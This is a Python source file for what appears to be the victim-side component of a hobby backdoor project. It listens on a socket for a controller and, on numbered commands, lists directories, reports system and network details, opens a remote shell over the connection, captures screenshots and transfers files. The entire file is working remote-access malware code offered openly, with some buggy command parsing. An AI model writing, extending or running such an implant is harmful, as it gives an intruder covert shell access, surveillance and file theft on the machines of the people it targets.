import socket
import os
import platform
import subprocess
import spawnshell
import threading
import pyautogui
import fileupload
import filedownload

SERVER = "127.0.0.1"
PORT = 1338
CWD = os.getcwd()
BUFFER_SIZE = 4096
HOSTNAME = socket.gethostname()
LOCALIP = socket.gethostbyname(HOSTNAME)
ARCH = str(platform.machine())
SYSINFO = str(platform.system())
NNAME = str(platform.node())
VERSION = str(platform.version())

x = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
x.bind((SERVER, PORT))
x.listen(5)
s, a = x.accept()
system = SYSINFO

def handleConn():
    while True:
        command = s.recv(BUFFER_SIZE).decode()
        if command == '':
            continue
        elif command == '00':
            break
        
        # If user wants to list the current working directory, use os.listdir() which returns a list
        elif '1' in command:
            args = command.split(" ")
            path = args[1]
            list_dir = os.listdir(path)
            # GET ELEMENTS OFF A LIST INTO 1 STRING
            # | | | | | | | | | | | 
            # v v v v v v v v v v v       
            ls = "\n".join(list_dir)
            s.send(str(ls).encode())
        
        # If user wants system information, display them taken from the platform library
        elif command == '2':
            all = f"Architecture: {ARCH}\n" + f"Operating System: {SYSINFO}\n" + f"Node name: {NNAME}\n" + f"System version: {VERSION}"
    
            s.send(all.encode())


        # If user wants network information, execute ipconfig/ifconfig on target and get more from sockets
        elif command == '3':
            # Traverse the ipconfig information
            if system == "Windows":
                data = subprocess.check_output(['ipconfig','/all']).decode('utf-8').split('\n')
            else:
                data = subprocess.check_output(['ifconfig']).decode('utf-8').split('\n')
            # Arrange the bytes data
            all = f"\nLocal IP: {LOCALIP}\n" + f"Hostname: {HOSTNAME}"
            data.append(all)
            s.send(str("\n".join(data)).encode())


        # If user wants to get a shell, spawn a shell using subprocess
        elif command == '4':
            spawnshell.terminal(s, CWD)
            s.send('[!] Stopped shell'.encode())
            continue
        
        elif command == '5':
            t = threading.Thread(target=takeScreenshot)
            t.start()
            continue
        
        elif command == '6':
            s.send(CWD.encode())

        elif command == '7':
            filename = command.split(" ")[1]
            filedownload.Download(s, filename, CWD)
        # If option not in menu, clear the screen
        else:
            print('Option not found!\n')
            if system == "Windows":
                os.system('cls')
            else:
                os.system('clear')
            continue
    
    # Close the connection
    s.close()

def takeScreenshot():
    myScreenshot = pyautogui.screenshot()

    # Before using this feature, create a file in the CWD called "screenshot.png"        
    myScreenshot.save(r'D:\\BackdoorProject\\screenshot.png')

if __name__ == '__main__':
    handleConn()